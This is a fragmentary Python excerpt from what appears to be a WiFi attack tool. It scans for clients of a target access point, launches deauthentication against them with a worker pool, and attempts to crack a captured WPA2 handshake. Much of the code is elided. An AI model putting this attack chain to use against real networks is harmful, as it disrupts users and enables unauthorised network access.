...
def find_clients(iface, bssid, stations):
	clients = [s.get('station') for s in stations if s.get('bssid') == bssid and s.get('station')]
			
	if not clients:
		print('No connected clients found in initial scan.')
				
		extended_csv = scan_once(iface, duration=30, out_prefix="extended_scan")
		if extended_csv:
			try:
				extended_parsed = parse_scan(extended_csv)
				extended_stations = extended_parsed.get('stations', [])
				clients = [s.get('station') for s in extended_stations if s.get('bssid') == bssid and s.get('station')]
				try:
...
def check_crack(cap_path):
	try:
		crack_cap(cap_path)
		return True
	except Exception as e:
		print(f"Error occurred while trying to crack WPA2 handshake: {e}")
		return False
	...
	if aps:
		...
		try:
			...
			if not clients:
				...
				stop_event.set()
				return 1	
			print(f'Found {len(clients)} client(s), starting deauth...')
			max_workers = max(8, len(clients))
